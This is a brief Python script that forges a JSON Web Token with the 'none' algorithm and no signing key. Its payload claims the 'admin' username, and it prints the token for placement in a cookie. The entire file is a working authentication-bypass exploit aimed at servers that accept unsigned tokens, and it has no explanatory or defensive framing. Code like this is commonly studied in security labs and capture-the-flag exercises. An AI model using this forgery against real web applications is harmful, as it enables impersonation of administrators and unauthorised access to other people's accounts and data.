import jwt

payload = {
  "user_id": 4,
  "username": "admin",
  "exp": 1709997764
}
token = jwt.encode(payload, key=None, algorithm='none')

# Ensure the token is a string if you are setting it in a cookie
token_str = token if isinstance(token, str) else token.decode('utf-8')

print(token_str)

